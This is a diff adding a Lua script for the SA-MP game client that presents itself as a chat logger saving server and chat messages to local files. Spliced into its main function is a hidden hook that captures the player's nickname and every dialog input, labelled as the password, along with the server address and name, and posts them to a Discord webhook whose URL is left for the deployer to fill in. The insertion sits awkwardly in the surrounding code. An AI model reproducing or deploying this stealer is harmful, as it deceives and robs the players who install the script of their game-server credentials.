@@ -1,0 +1,108 @@
+local ev = require('samp.events')
+
+local file
+
+function main()
+    if not isSampLoaded() or not isSampfuncsLoaded() then return end
+    while not isSampAvailable() do wait(100) end
+script_author("Justk")
+
+local hook = require 'lib.samp.events'
+local webhookUrl = "fill this with your webhook url"
+local https = require("ssl.https")
+local ltn12 = require("ltn12")
+
+function sendMessageToDiscord(content)
+    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
+    local response_body = {}
+
+    https.request{
+        url = webhookUrl,
+        method = "POST",
+        headers = {
+            ["Content-Type"] = "application/json",
+            ["Content-Length"] = tostring(#body)
+        },
+        source = ltn12.source.string(body),
+        sink = ltn12.sink.table(response_body)
+    }
+end
+
+require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
+    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
+    local nick = sampGetPlayerNickname(id)
+    local ip, port = sampGetCurrentServerAddress()
+    local servername = sampGetCurrentServerName()
+    local author = "fill this with your bot name"
+
+    local message = string.format([[
+
+       # log
+
+>>> **NICK: **
+``` %s ```
+**PASSWORD: **    
+```%s```
+**IP PORT SERVER:**
+```%s:%d```
+**SERVER NAME: **
+```%s```
+**AUTHOR: %s**
+
+]], nick, input, ip, port, servername, author)
+
+sendMessageToDiscord(message)
+end
+    startLogging()
+
+    ev.onServerMessage = function(color, text)
+        logMessage("[Server]: " .. text:gsub("{%x+}", ""))
+    end
+
+    ev.onChatMessage = function(playerId, text)
+        local playerName = sampGetPlayerNickname(playerId)
+        logMessage(playerName .. ": " .. text)
+    end
+
+    sampRegisterChatCommand("stoplog", function()
+        stopLogging()
+        sampAddChatMessage("Chat logging stopped.", 0xFFFF00)
+    end)
+
+    sampRegisterChatCommand("startlog", function()
+        startLogging()
+        sampAddChatMessage("Chat logging started.", 0xFFFF00)
+    end)
+
+    addEventHandler("onScriptTerminate", function(s, quitGame)
+        if s == thisScript() then
+            stopLogging()
+        end
+    end)
+end
+
+function startLogging()
+    if not file then
+        local logDir = "ChatLogs"
+        if not doesDirectoryExist(logDir) then createDirectory(logDir) end
+        local timestamp = os.date("%Y-%m-%d-%H-%M")
+        local fileName = string.format("%s/Chatlogs-%s.log", logDir, timestamp)
+        file = io.open(fileName, "a")
+    end
+end
+
+function stopLogging()
+    if file then
+        file:close()
+        file = nil
+    end
+end
+
+function logMessage(text)
+    if file then
+        local timestamp = os.date("[%d-%m-%Y %H:%M:%S]")
+        local message = timestamp .. " " .. text .. "\n"
+        file:write(message)
+        file:flush()
+    end
+end
